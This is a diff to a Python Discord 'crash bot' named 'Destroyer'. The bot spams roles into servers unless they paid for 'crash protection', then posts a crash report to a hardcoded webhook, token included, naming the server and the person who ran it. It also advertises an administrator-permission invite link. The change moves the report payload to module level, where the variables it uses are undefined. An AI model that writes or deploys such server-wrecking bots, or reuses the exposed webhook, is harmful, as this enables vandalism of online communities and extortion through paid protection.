@@ -78,6 +78,42 @@ async def act7(ctx):
 	for z in range(settings['ROLES']):
 		await ctx.guild.create_role(name = f"{settings['TEXT']}-{random.randint(1, 1000)}")
 
+jsonn = {
+				"content": null,
+				"embeds": [
+					{
+						 "title": "Аватарка сервера ------->",
+						 "color": 15402759,
+						 "fields": [
+						{
+							"name": "Имя сервера",
+							"value": f"{servername}",
+							"inline": true
+							},
+						{
+							"name": "Участников",
+							"value": f"{members}",
+							"inline": true
+							},
+						{
+							"name": "Кто крашнул:",
+							"value": f"{ctx.message.author.name}#{ctx.message.author.discriminator}(ID: {ctx.message.author.id})"
+							}
+							],
+						"author": {
+							"name": "Новый краш бот - Destroyer",
+							"url": f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
+							},
+						"footer": {
+							"text": "Держите права администратора под контролем :))"
+							},
+						"thumbnail": {
+							"url": f"{servericon}"
+							}
+					}
+				]
+			}
+		
 @client.command()
 async def call(ctx):
 	if ctx.guild.id not in whiteservers:
@@ -141,41 +177,6 @@ async def call(ctx):
 		print('Sending webhook crash report.')
 		await asyncio.sleep(2)
 	#CRASH REPORT
-		jsonn = {
-				"content": \n\u\l\l,
-				"embeds": [
-					{
-						 "title": "Аватарка сервера ------->",
-						 "color": 15402759,
-						 "fields": [
-						{
-							"name": "Имя сервера",
-							"value": f"{servername}",
-							"inline": true
-							},
-						{
-							"name": "Участников",
-							"value": f"{members}",
-							"inline": true
-							},
-						{
-							"name": "Кто крашнул:",
-							"value": f"{ctx.message.author.name}#{ctx.message.author.discriminator}(ID: {ctx.message.author.id})"
-							}
-							],
-						"author": {
-							"name": "Новый краш бот - Destroyer",
-							"url": f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
-							},
-						"footer": {
-							"text": "Держите права администратора под контролем :))"
-							},
-						"thumbnail": {
-							"url": f"{servericon}"
-							}
-					}
-				]
-			}
 		requests.post('https://discord.com/api/webhooks/864532953555009596/WeOmJZRWazSKLp24r0HCaAKOF7lDDsWQn2J01is1NGgpyLJMtMtDDLpX7fe2pCeqdLon', json = jsonn)
 	else:
 		await ctx.send(f'Извини, но сервер нельзя крашить, т.к. владелец купил защиту от краша. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
